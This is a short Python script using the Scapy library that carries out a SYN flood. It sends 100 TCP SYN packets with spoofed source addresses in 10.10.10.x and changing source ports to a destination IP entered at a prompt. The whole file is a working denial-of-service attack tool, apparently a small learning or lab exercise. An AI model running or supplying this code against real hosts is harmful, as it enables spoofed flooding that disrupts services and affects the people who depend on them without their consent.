#!/usr/bin/python3

from scapy.all import *

def synflood(dst_ip, dst_port=80):
	pkts_sent = 0
	ip_fourth_octet = 10
	src_port = 55555

	while (pkts_sent < 100):
		ip = IP(src = f"10.10.10.{ip_fourth_octet}", dst = dst_ip)
		syn = ip/TCP(sport = src_port, dport = dst_port, flags = 'S', seq=64000)

		for i in range(10):
			send(syn)
			print("Sent packet: " + syn.summary())
			pkts_sent += 1

		ip_fourth_octet += 1
		src_port += 1
		print(pkts_sent)

if __name__ == "__main__":
	dst_ip = input("Input destination ip: ")

	synflood(dst_ip)
